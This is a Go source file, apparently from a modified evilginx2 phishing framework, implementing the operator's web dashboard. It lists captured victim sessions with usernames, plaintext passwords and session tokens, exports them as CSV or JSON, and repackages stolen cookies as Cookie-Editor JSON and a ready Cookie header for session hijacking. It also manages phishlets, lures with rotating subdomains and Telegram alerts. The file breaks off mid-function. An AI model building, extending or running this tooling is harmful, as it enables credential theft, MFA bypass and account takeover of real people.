package core

import (
	"crypto/rc4"
	"crypto/x509"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// ===========================================================================
// DTOs
// ===========================================================================

type panelGeo struct {
	Country    string `json:"country"`
	CountryISO string `json:"country_iso"`
	City       string `json:"city"`
	ISP        string `json:"isp"`
	VPN        bool   `json:"vpn"`
	Proxy      bool   `json:"proxy"`
	Datacenter bool   `json:"datacenter"`
}

type panelSession struct {
	Id           int                                         `json:"id"`
	Phishlet     string                                      `json:"phishlet"`
	Username     string                                      `json:"username"`
	Password     string                                      `json:"password"`
	RemoteAddr   string                                      `json:"remote_addr"`
	UserAgent    string                                      `json:"useragent"`
	LandingURL   string                                      `json:"landing_url"`
	CreateTime   int64                                       `json:"create_time"`
	UpdateTime   int64                                       `json:"update_time"`
	HasTokens    bool                                        `json:"has_tokens"`
	TokenCount   int                                         `json:"token_count"`
	Custom       map[string]string                           `json:"custom,omitempty"`
	BodyTokens   map[string]string                           `json:"body_tokens,omitempty"`
	HttpTokens   map[string]string                           `json:"http_tokens,omitempty"`
	CookieTokens map[string]map[string]*database.CookieToken `json:"tokens,omitempty"`
	Geo          *panelGeo                                   `json:"geo,omitempty"`
	Reviewed     bool                                        `json:"reviewed"`
}

func toPanelSession(s *database.Session) *panelSession {
	count := 0
	for _, g := range s.CookieTokens {
		count += len(g)
	}
	count += len(s.BodyTokens) + len(s.HttpTokens)

	ps := &panelSession{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		Username:     s.Username,
		Password:     s.Password,
		RemoteAddr:   s.RemoteAddr,
		UserAgent:    s.UserAgent,
		LandingURL:   s.LandingURL,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
		HasTokens:    hasTokens(s),
		TokenCount:   count,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: s.CookieTokens,
		Reviewed:     s.Reviewed,
	}
	if g := geoFromCustom(s.Custom); g != nil {
		ps.Geo = g
	}
	return ps
}

func geoFromCustom(c map[string]string) *panelGeo {
	if c == nil {
		return nil
	}
	if c["geo_country_name"] == "" && c["geo_city_name"] == "" && c["geo_isp"] == "" {
		return nil
	}
	return &panelGeo{
		Country:    c["geo_country_name"],
		CountryISO: c["geo_country_code"],
		City:       c["geo_city_name"],
		ISP:        c["geo_isp"],
		VPN:        c["geo_vpn"] == "true",
		Proxy:      c["geo_proxy"] == "true",
		Datacenter: c["geo_datacenter"] == "true",
	}
}

// ===========================================================================
// overview / system
// ===========================================================================

func (ds *DashboardServer) handleOverview(w http.ResponseWriter, r *http.Request) {
	if err := ds.reloadSessions(); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	sessions := ds.cachedSessions()

	withTokens := 0
	uniqueIPs := map[string]bool{}
	byPhishlet := map[string]int{}
	byCountry := map[string]int{}
	var lastCapture int64
	for _, s := range sessions {
		if hasTokens(s) {
			withTokens++
		}
		if s.RemoteAddr != "" {
			uniqueIPs[s.RemoteAddr] = true
		}
		byPhishlet[s.Phishlet]++
		if s.CreateTime > lastCapture {
			lastCapture = s.CreateTime
		}
		if cn := s.Custom["geo_country_name"]; cn != "" {
			byCountry[cn]++
		}
	}

	// 14-day timeline
	now := time.Now().UTC()
	dayStart := now.Truncate(24 * time.Hour)
	type dayCount struct {
		Day   string `json:"day"`
		Count int    `json:"count"`
	}
	timeline := make([]dayCount, 14)
	bucket := map[int64]int{}
	for _, s := range sessions {
		d := time.Unix(s.CreateTime, 0).UTC().Truncate(24 * time.Hour)
		bucket[d.Unix()]++
	}
	for i := 13; i >= 0; i-- {
		d := dayStart.AddDate(0, 0, -i)
		timeline[13-i] = dayCount{Day: d.Format("01-02"), Count: bucket[d.Unix()]}
	}

	type plCount struct {
		Phishlet string `json:"phishlet"`
		Count    int    `json:"count"`
	}
	topPhishlets := make([]plCount, 0, len(byPhishlet))
	for k, v := range byPhishlet {
		topPhishlets = append(topPhishlets, plCount{k, v})
	}
	sort.Slice(topPhishlets, func(i, j int) bool { return topPhishlets[i].Count > topPhishlets[j].Count })

	type cnCount struct {
		Country string `json:"country"`
		Count   int    `json:"count"`
	}
	topCountries := make([]cnCount, 0, len(byCountry))
	for k, v := range byCountry {
		topCountries = append(topCountries, cnCount{k, v})
	}
	sort.Slice(topCountries, func(i, j int) bool { return topCountries[i].Count > topCountries[j].Count })
	if len(topCountries) > 8 {
		topCountries = topCountries[:8]
	}

	writeJSON(w, 200, map[string]interface{}{
		"total_sessions":    len(sessions),
		"with_tokens":       withTokens,
		"no_tokens":         len(sessions) - withTokens,
		"unique_ips":        len(uniqueIPs),
		"active_sessions":   ds.activeSessionCount(),
		"last_capture":      lastCapture,
		"timeline":          timeline,
		"top_phishlets":     topPhishlets,
		"top_countries":     topCountries,
		"enabled_phishlets": len(ds.cfg.GetEnabledSites()),
		"lures":             ds.cfg.GetLureCount(),
	})
}

func (ds *DashboardServer) handleSystem(w http.ResponseWriter, r *http.Request) {
	out := map[string]interface{}{
		"version":          VERSION,
		"commit":           COMMIT,
		"uptime":           int64(time.Since(ds.started).Seconds()),
		"now":              time.Now().Unix(),
		"domain":           ds.cfg.GetBaseDomain(),
		"external_ip":      ds.cfg.GetServerExternalIP(),
		"https_port":       ds.cfg.GetHttpsPort(),
		"dns_port":         ds.cfg.GetDnsPort(),
		"autocert":         ds.cfg.IsAutocertEnabled(),
		"strip_headers":    ds.cfg.IsStripHeadersEnabled(),
		"unauth_redirect":  ds.cfg.IsUnauthRedirectEnabled(),
		"block_vpn":        ds.cfg.GetBlockVPN(),
		"geoip":            ds.cfg.GetGeoIP() != nil,
		"telegram":         ds.cfg.GetTelegramBotToken() != "" && ds.cfg.GetTelegramChatID() != "",
		"gophish":          ds.cfg.GetGoPhishAdminUrl() != "" && ds.cfg.GetGoPhishApiKey() != "",
		"turnstile":        ds.cfg.GetTurnstileSiteKey() != "",
		"blacklist_mode":   ds.cfg.GetBlacklistMode(),
		"active_hostnames": ds.cfg.GetActiveHostnames(""),
		"auth":             ds.credsEnabled(),
	}
	if ds.bl != nil {
		blIps, blMasks := ds.bl.GetStats()
		out["blacklist_ips"] = blIps
		out["blacklist_masks"] = blMasks
	}
	if ds.crtDb != nil && ds.crtDb.wildcardCert != nil && len(ds.crtDb.wildcardCert.Certificate) > 0 {
		out["wildcard_domain"] = ds.crtDb.wildcardDomain
	}
	out["cert"] = ds.certStatus()
	writeJSON(w, 200, out)
}

// certStatus returns info about the loaded wildcard certificate, if any.
func (ds *DashboardServer) certStatus() map[string]interface{} {
	res := map[string]interface{}{"loaded": false}
	if ds.crtDb == nil || ds.crtDb.wildcardCert == nil || len(ds.crtDb.wildcardCert.Certificate) == 0 {
		return res
	}
	cert, err := parseCertDER(ds.crtDb.wildcardCert.Certificate[0])
	if err != nil {
		return res
	}
	res["loaded"] = true
	res["subject"] = cert.Subject.CommonName
	res["issuer"] = cert.Issuer.CommonName
	res["not_before"] = cert.NotBefore.Unix()
	res["not_after"] = cert.NotAfter.Unix()
	res["days_left"] = int(time.Until(cert.NotAfter).Hours() / 24)

	// locate the wildcard cert file for display
	cfgDir := ds.cfgDir()
	for _, p := range []string{
		filepath.Join(cfgDir, "crt", "wildcard", "fullchain.pem"),
		filepath.Join(cfgDir, "wildcard.pem"),
	} {
		if _, err := os.Stat(p); err == nil {
			res["path"] = p
			break
		}
	}
	return res
}

func (ds *DashboardServer) cfgDir() string {
	if ds.cfg != nil && ds.cfg.cfg != nil {
		if p := ds.cfg.cfg.ConfigFileUsed(); p != "" {
			return filepath.Dir(p)
		}
	}
	return "."
}

// ===========================================================================
// sessions
// ===========================================================================

func (ds *DashboardServer) handleSessions(w http.ResponseWriter, r *http.Request) {
	if err := ds.reloadSessions(); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	sessions := ds.cachedSessions()

	q := r.URL.Query()
	search := strings.ToLower(strings.TrimSpace(q.Get("search")))
	phishlet := q.Get("phishlet")
	tokenFilter := q.Get("tokens")
	sortField := q.Get("sort")
	sortDir := q.Get("dir")

	plSet := map[string]bool{}
	filtered := make([]*database.Session, 0, len(sessions))
	for _, s := range sessions {
		plSet[s.Phishlet] = true
		if phishlet != "" && s.Phishlet != phishlet {
			continue
		}
		if tokenFilter == "yes" && !hasTokens(s) {
			continue
		}
		if tokenFilter == "no" && hasTokens(s) {
			continue
		}
		if search != "" {
			if !strings.Contains(strings.ToLower(s.Username), search) &&
				!strings.Contains(strings.ToLower(s.Password), search) &&
				!strings.Contains(strings.ToLower(s.Phishlet), search) &&
				!strings.Contains(strings.ToLower(s.RemoteAddr), search) &&
				!strings.Contains(strings.ToLower(s.UserAgent), search) {
				continue
			}
		}
		filtered = append(filtered, s)
	}

	lessFn := func(i, j int) bool {
		a, b := filtered[i], filtered[j]
		switch sortField {
		case "username":
			return strings.ToLower(a.Username) < strings.ToLower(b.Username)
		case "phishlet":
			return a.Phishlet < b.Phishlet
		case "remote_addr":
			return a.RemoteAddr < b.RemoteAddr
		case "tokens":
			return a.Id < b.Id
		default:
			return a.CreateTime < b.CreateTime
		}
	}
	asc := sortDir == "asc"
	if sortField == "" {
		sortField = "create_time"
	}
	sort.SliceStable(filtered, func(i, j int) bool {
		if asc {
			return lessFn(i, j)
		}
		return lessFn(j, i)
	})

	total := len(filtered)
	limit := parseIntDefault(q.Get("limit"), 50)
	offset := parseIntDefault(q.Get("offset"), 0)
	if limit <= 0 {
		limit = 50
	}
	end := offset + limit
	if offset > total {
		offset = total
	}
	if end > total {
		end = total
	}
	page := filtered[offset:end]

	out := make([]*panelSession, 0, len(page))
	for _, s := range page {
		out = append(out, toPanelSession(s))
	}

	plNames := make([]string, 0, len(plSet))
	for k := range plSet {
		plNames = append(plNames, k)
	}
	sort.Strings(plNames)

	writeJSON(w, 200, map[string]interface{}{
		"sessions":  out,
		"total":     total,
		"offset":    offset,
		"limit":     limit,
		"phishlets": plNames,
	})
}

func (ds *DashboardServer) handleSessionDetail(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid session id")
		return
	}
	s, err := ds.db.GetSessionById(id)
	if err != nil {
		jsonErr(w, 404, "session not found")
		return
	}
	writeJSON(w, 200, toPanelSession(s))
}

func (ds *DashboardServer) handleSessionDelete(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid session id")
		return
	}
	if err := ds.db.DeleteSessionById(id); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (ds *DashboardServer) handleSessionsBulkDelete(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		Ids []int `json:"ids"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	deleted := 0
	for _, id := range payload.Ids {
		if err := ds.db.DeleteSessionById(id); err == nil {
			deleted++
		}
	}
	writeJSON(w, 200, map[string]interface{}{"deleted": deleted})
}

func (ds *DashboardServer) handleSessionsClear(w http.ResponseWriter, r *http.Request) {
	sessions, err := ds.db.ListSessions()
	if err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	deleted := 0
	for _, s := range sessions {
		if err := ds.db.DeleteSessionById(s.Id); err == nil {
			deleted++
		}
	}
	ds.db.Flush()
	writeJSON(w, 200, map[string]interface{}{"deleted": deleted})
}

func (ds *DashboardServer) handleSessionsExport(w http.ResponseWriter, r *http.Request) {
	if err := ds.reloadSessions(); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	sessions := ds.cachedSessions()
	sort.Slice(sessions, func(i, j int) bool { return sessions[i].CreateTime > sessions[j].CreateTime })

	format := r.URL.Query().Get("format")
	if format == "" {
		format = "csv"
	}
	switch format {
	case "json":
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.json", time.Now().Unix()))
		json.NewEncoder(w).Encode(sessions)
	default:
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.csv", time.Now().Unix()))
		cw := csv.NewWriter(w)
		defer cw.Flush()
		cw.Write([]string{"ID", "Phishlet", "Username", "Password", "Remote Address", "User-Agent", "Landing URL", "Tokens", "Created (UTC)"})
		for _, s := range sessions {
			cw.Write([]string{
				strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, s.RemoteAddr, s.UserAgent, s.LandingURL,
				strconv.FormatBool(hasTokens(s)),
				time.Unix(s.CreateTime, 0).UTC().Format("2006-01-02 15:04:05"),
			})
		}
	}
}

// handleSessionCookies returns Cookie-Editor compatible JSON + a ready Cookie header.
// Shape is identical to the legacy /api/cookies/{id} endpoint so the browser
// extension contract is preserved.
func (ds *DashboardServer) handleSessionCookies(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid session id")
		return
	}
	s, err := ds.db.GetSessionById(id)
	if err != nil {
		jsonErr(w, 404, "session not found")
		return
	}

	type cookieExport struct {
		Name           string  `json:"name"`
		Value          string  `json:"value"`
		Domain         string  `json:"domain"`
		HostOnly       bool    `json:"hostOnly"`
		Path           string  `json:"path"`
		Secure         bool    `json:"secure"`
		HttpOnly       bool    `json:"httpOnly"`
		SameSite       string  `json:"sameSite"`
		Session        bool    `json:"session"`
		ExpirationDate int64   `json:"expirationDate"`
		StoreID        *string `json:"storeId"`
	}

	expiry := time.Now().AddDate(1, 0, 0).Unix()
	cookies := []cookieExport{}
	for domain, group := range s.CookieTokens {
		cd := domain
		if !strings.HasPrefix(cd, ".") {
			cd = "." + cd
		}
		for _, tok := range group {
			path := tok.Path
			if path == "" {
				path = "/"
			}
			cookies = append(cookies, cookieExport{
				Name: tok.Name, Value: tok.Value, Domain: cd, HostOnly: false, Path: path,
				Secure: tok.Secure, HttpOnly: tok.HttpOnly, SameSite: "Lax", Session: false,
				ExpirationDate: expiry,
			})
		}
	}
	sort.Slice(cookies, func(i, j int) bool {
		if cookies[i].Domain == cookies[j].Domain {
			return cookies[i].Name < cookies[j].Name
		}
		return cookies[i].Domain < cookies[j].Domain
	})

	targetURL := ""
	if pl, err := ds.cfg.GetPhishlet(s.Phishlet); err == nil {
		targetURL = pl.GetLoginUrl()
	}
	if targetURL == "" {
		for domain := range s.CookieTokens {
			targetURL = "https://" + strings.TrimPrefix(domain, ".")
			break
		}
	}

	headerParts := make([]string, 0, len(cookies))
	for _, c := range cookies {
		headerParts = append(headerParts, c.Name+"="+c.Value)
	}

	writeJSON(w, 200, map[string]interface{}{
		"session_id":    id,
		"phishlet":      s.Phishlet,
		"cookies":       cookies,
		"target_url":    targetURL,
		"count":         len(cookies),
		"cookie_header": strings.Join(headerParts, "; "),
	})
}

// ===========================================================================
// phishlets
// ===========================================================================

func (ds *DashboardServer) phishletDTO(name string, pl *Phishlet) map[string]interface{} {
	hostname, _ := ds.cfg.GetSiteDomain(name)
	unauth, _ := ds.cfg.GetSiteUnauthUrl(name)
	hosts := []string{}
	if hostname != "" {
		for _, h := range pl.GetPhishHosts(false) {
			hosts = append(hosts, h)
		}
	}
	return map[string]interface{}{
		"name":         name,
		"author":       pl.Author,
		"filename":     filepath.Base(pl.Path),
		"template":     pl.isTemplate,
		"parent":       pl.ParentName,
		"enabled":      ds.cfg.IsSiteEnabled(name),
		"hidden":       ds.cfg.IsSiteHidden(name),
		"hostname":     hostname,
		"unauth_url":   unauth,
		"landing_host": func() string { h := pl.GetLandingPhishHost(); return h }(),
		"login_host":   pl.login.domain,
		"hosts":        hosts,
	}
}

func (ds *DashboardServer) handlePhishlets(w http.ResponseWriter, r *http.Request) {
	out := []map[string]interface{}{}
	for _, name := range ds.cfg.GetPhishletNames() {
		pl, err := ds.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}
		out = append(out, ds.phishletDTO(name, pl))
	}
	sort.Slice(out, func(i, j int) bool { return out[i]["name"].(string) < out[j]["name"].(string) })
	writeJSON(w, 200, map[string]interface{}{"phishlets": out})
}

func (ds *DashboardServer) handlePhishletEnable(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	name := r.PathValue("name")
	pl, err := ds.cfg.GetPhishlet(name)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	if pl.isTemplate {
		jsonErr(w, 400, "phishlet is a template - create a child phishlet first")
		return
	}
	if err := ds.cfg.SetSiteEnabled(name); err != nil {
		ds.cfg.SetSiteDisabled(name)
		jsonErr(w, 400, err.Error())
		return
	}
	ds.manageCerts(false)
	writeJSON(w, 200, ds.phishletDTO(name, pl))
}

func (ds *DashboardServer) handlePhishletDisable(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	name := r.PathValue("name")
	if err := ds.cfg.SetSiteDisabled(name); err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	ds.manageCerts(false)
	writeJSON(w, 200, map[string]string{"status": "disabled"})
}

func (ds *DashboardServer) handlePhishletHide(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	name := r.PathValue("name")
	var payload struct {
		Hidden bool `json:"hidden"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if err := ds.cfg.SetSiteHidden(name, payload.Hidden); err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	writeJSON(w, 200, map[string]interface{}{"hidden": payload.Hidden})
}

func (ds *DashboardServer) handlePhishletHostname(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	name := r.PathValue("name")
	var payload struct {
		Hostname string `json:"hostname"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if _, err := ds.cfg.GetPhishlet(name); err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	if ok := ds.cfg.SetSiteHostname(name, payload.Hostname); ok {
		ds.cfg.SetSiteDisabled(name)
		ds.manageCerts(false)
	} else {
		jsonErr(w, 400, "could not set hostname")
		return
	}
	pl, _ := ds.cfg.GetPhishlet(name)
	writeJSON(w, 200, ds.phishletDTO(name, pl))
}

func (ds *DashboardServer) handlePhishletUnauthURL(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	name := r.PathValue("name")
	var payload struct {
		URL string `json:"url"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if _, err := ds.cfg.GetPhishlet(name); err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	ds.cfg.SetSiteUnauthUrl(name, payload.URL)
	writeJSON(w, 200, map[string]string{"unauth_url": payload.URL})
}

func (ds *DashboardServer) handlePhishletReload(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	name := r.PathValue("name")
	pl, err := ds.cfg.GetPhishlet(name)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	if pl.ParentName != "" {
		jsonErr(w, 400, "cannot reload child phishlet - reload its parent instead")
		return
	}
	newPl, err := NewPhishlet(name, pl.Path, nil, ds.cfg)
	if err != nil {
		jsonErr(w, 400, "failed to parse phishlet YAML: "+err.Error())
		return
	}
	if err := ds.cfg.ReloadPhishlet(name, newPl); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	if ds.cfg.IsSiteEnabled(name) {
		ds.cfg.refreshActiveHostnames()
		ds.manageCerts(false)
	}
	writeJSON(w, 200, ds.phishletDTO(name, newPl))
}

func (ds *DashboardServer) handlePhishletsRefresh(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	pDir := ds.cfg.GetPhishletsDir()
	files, err := os.ReadDir(pDir)
	if err != nil {
		jsonErr(w, 500, "cannot read phishlets directory: "+err.Error())
		return
	}
	pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
	added, refreshed := []string{}, []string{}
	reloadedEnabled := false
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		m := pr.FindStringSubmatch(f.Name())
		if m == nil || m[1] == "" {
			continue
		}
		name := m[1]
		existing, lookupErr := ds.cfg.GetPhishlet(name)
		if lookupErr == nil && existing.ParentName != "" {
			continue
		}
		newPl, parseErr := NewPhishlet(name, filepath.Join(pDir, f.Name()), nil, ds.cfg)
		if parseErr != nil {
			log.Error("refresh: failed to parse '%s': %v", f.Name(), parseErr)
			continue
		}
		if lookupErr != nil {
			ds.cfg.AddPhishlet(name, newPl)
			added = append(added, name)
		} else {
			if err := ds.cfg.ReloadPhishlet(name, newPl); err != nil {
				continue
			}
			refreshed = append(refreshed, name)
		}
		if ds.cfg.IsSiteEnabled(name) {
			reloadedEnabled = true
		}
	}
	if reloadedEnabled {
		ds.cfg.refreshActiveHostnames()
		ds.manageCerts(false)
	}
	writeJSON(w, 200, map[string]interface{}{"added": added, "refreshed": refreshed})
}

func (ds *DashboardServer) handlePhishletYAML(w http.ResponseWriter, r *http.Request) {
	name := r.PathValue("name")
	pl, err := ds.cfg.GetPhishlet(name)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	data, err := os.ReadFile(pl.Path)
	if err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"name": name, "yaml": string(data)})
}

func (ds *DashboardServer) handlePhishletHosts(w http.ResponseWriter, r *http.Request) {
	name := r.PathValue("name")
	pl, err := ds.cfg.GetPhishlet(name)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	ip := ds.cfg.GetServerExternalIP()
	recs := []map[string]string{}
	for _, h := range pl.GetPhishHosts(false) {
		recs = append(recs, map[string]string{"type": "A", "name": h, "value": ip})
	}
	writeJSON(w, 200, map[string]interface{}{"records": recs, "server_ip": ip, "wildcard": ds.baseDomain() != ""})
}

func (ds *DashboardServer) manageCerts(verbose bool) {
	if ds.crtDb == nil || ds.hp == nil {
		return
	}
	if ds.hp.developer {
		return
	}
	if ds.cfg.IsAutocertEnabled() {
		hosts := ds.cfg.GetActiveHostnames("")
		var acmeHosts []string
		for _, h := range hosts {
			if !ds.crtDb.IsWildcardCovered(h) {
				acmeHosts = append(acmeHosts, h)
			}
		}
		if err := ds.crtDb.setManagedSync(acmeHosts, 60*time.Second); err != nil {
			log.Error("failed to set up TLS certificates: %s", err)
		}
	} else {
		if err := ds.crtDb.setUnmanagedSync(verbose); err != nil {
			log.Error("failed to set up TLS certificates: %s", err)
		}
	}
}

// ===========================================================================
// lures
// ===========================================================================

func (ds *DashboardServer) lureDTO(i int, l *Lure) map[string]interface{} {
	link := ""
	if pl, err := ds.cfg.GetPhishlet(l.Phishlet); err == nil {
		if l.Hostname != "" {
			link = "https://" + l.Hostname + l.Path
		} else if u, err := pl.GetLureUrl(l.Path); err == nil {
			link = u
		}
	}
	paused := l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now())
	active := true
	if l.ActiveHours != "" || l.ActiveDays != "" {
		active = isLureActiveNow(l)
	}
	return map[string]interface{}{
		"id":              i,
		"phishlet":        l.Phishlet,
		"hostname":        l.Hostname,
		"path":            l.Path,
		"link":            link,
		"info":            l.Info,
		"redirect_url":    l.RedirectUrl,
		"redirector":      l.Redirector,
		"ua_filter":       l.UserAgentFilter,
		"active_hours":    l.ActiveHours,
		"active_days":     l.ActiveDays,
		"active_tz":       l.ActiveTZ,
		"og_title":        l.OgTitle,
		"og_desc":         l.OgDescription,
		"og_image":        l.OgImageUrl,
		"og_url":          l.OgUrl,
		"auto_rotate":     l.AutoRotate,
		"rotate_interval": l.RotateInterval,
		"next_rotate":     l.NextRotate,
		"rotate_notify":   l.RotateNotify,
		"paused":          paused,
		"paused_until":    l.PausedUntil,
		"active":          active,
		"gateway": func() string {
			if l.AutoRotate {
				return "https://" + l.Hostname
			}
			return ""
		}(),
	}
}

func (ds *DashboardServer) handleLures(w http.ResponseWriter, r *http.Request) {
	out := []map[string]interface{}{}
	for i, l := range ds.cfg.lures {
		out = append(out, ds.lureDTO(i, l))
	}
	writeJSON(w, 200, map[string]interface{}{"lures": out})
}

func (ds *DashboardServer) handleLureDetail(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	l, err := ds.cfg.GetLure(id)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	writeJSON(w, 200, ds.lureDTO(id, l))
}

func (ds *DashboardServer) handleLureCreate(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	var payload struct {
		Phishlet  string `json:"phishlet"`
		Subdomain string `json:"subdomain"`
		Interval  string `json:"interval"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if _, err := ds.cfg.GetPhishlet(payload.Phishlet); err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	if payload.Subdomain == "" {
		l := &Lure{Path: "/" + GenRandomString(8), Phishlet: payload.Phishlet}
		ds.cfg.AddLure(payload.Phishlet, l)
		writeJSON(w, 200, map[string]interface{}{"id": len(ds.cfg.lures) - 1, "url": ds.lureDTO(len(ds.cfg.lures)-1, l)["link"]})
		return
	}
	subRe := regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$`)
	if !subRe.MatchString(payload.Subdomain) {
		jsonErr(w, 400, "invalid subdomain")
		return
	}
	bhost, ok := ds.cfg.GetSiteDomain(payload.Phishlet)
	if !ok || bhost == "" {
		jsonErr(w, 400, "no domain configured for phishlet - set a hostname first")
		return
	}
	hostname := payload.Subdomain + "." + bhost

	if payload.Interval != "" {
		d, err := ParseDurationString(payload.Interval)
		if err != nil || int64(d.Seconds()) < 60 {
			jsonErr(w, 400, "invalid interval (use e.g. 30m, 1h30m)")
			return
		}
		now := time.Now().Unix()
		l := &Lure{
			Path:           "/" + GenRandomString(8),
			Phishlet:       payload.Phishlet,
			Hostname:       hostname,
			AutoRotate:     true,
			RotateInterval: int64(d.Seconds()),
			NextRotate:     now + int64(d.Seconds()),
			RotateNotify:   true,
		}
		ds.cfg.AddLure(payload.Phishlet, l)
		ds.cfg.refreshActiveHostnames()
		ds.manageCerts(false)
		writeJSON(w, 200, ds.lureDTO(len(ds.cfg.lures)-1, l))
		return
	}

	l := &Lure{Path: "/" + GenRandomString(8), Phishlet: payload.Phishlet, Hostname: hostname}
	ds.cfg.AddLure(payload.Phishlet, l)
	writeJSON(w, 200, ds.lureDTO(len(ds.cfg.lures)-1, l))
}

func (ds *DashboardServer) handleLureEdit(w http.ResponseWriter, r *http.Request) {
	ds.opMu.Lock()
	defer ds.opMu.Unlock()
	id, err := strconv.Atoi(r.PathValue("id"))
	if err != nil {
		jsonErr(w, 400, "invalid lure id")
		return
	}
	l, err := ds.cfg.GetLure(id)
	if err != nil {
		jsonErr(w, 404, err.Error())
		return
	}
	var payload struct {
		Field string `json:"field"`
		Value string `json:"value"`
	}
	if err := readJSON(r, &payload); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	val := payload.Value
	certRefresh := false
	switch payload.Field {
	case "hostname":
		if val != "" {
			val = strings.ToLower(val)
			if val != ds.cfg.general.Domain && !strings.HasSuffix(val, "."+ds.cfg.general.Domain) {
				jsonErr(w, 400, "lure hostname must end with the base domain")
				return
			}
			hostRe := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
			if !hostRe.MatchString(val) {
				jsonErr(w, 400, "invalid hostname")
				return
			}
			l.Hostname = val
			certRefresh = true
		} else {
			l.Hostname = ""
		}
	case "path":
		if val != "" {
			if !strings.HasPrefix(val, "/") {
				val = "/" + val
			}
			l.Path = val
		} else {
			l.Path = "/"
		}
	case "redirect_url":
		if val != "" {
			u, err := url.Parse(val)
			if err != nil || !u.IsAbs() {
				jsonErr(w, 400, "redirect url must be absolute")
				return
			}
		}
		l.RedirectUrl = val
	case "phishlet":
		if _, err := ds.cfg.GetPhishlet(val); err != nil {
			jsonErr(w, 400, err.Error())
			return
		}
		l.Phishlet = val
	case "info":
		l.Info = val
	case "og_title":
		l.OgTitle = val
	case "og_desc":
		l.OgDescription = val
	case "og_image":
		l.OgImageUrl = val
	case "og_url":
		l.OgUrl = val
	case "redirector":
		if val != "" {
			p := val
			if !filepath.IsAbs(p) {
				p = filepath.Join(ds.cfg.GetRedirectorsDir(), val)
			}
			if _, err := os.Stat(p); os.IsNotExist(err) {
				jsonErr(w, 400, "redirector directory does not exist")
				return
			}
		}
		l.Redirector = val
	case "ua_filter":
		if val != "" {
			if _, err := regexp.Compile(val); err != nil {
				jsonErr(w, 400, err.Error())
				return
			}
		}
		l.UserAgentFilter = val
	case "active_hours":
		if val != "" {
			if !regexp.MustCompile(`^\d{2}:\d{2}-\d{2}:\d{2}$`).MatchString(val) {
				jsonErr(w, 400, "active_hours must be HH:MM-HH:MM")
				return
			}
		}
		l.ActiveHours = val
	case "active_days":
		if val != "" {
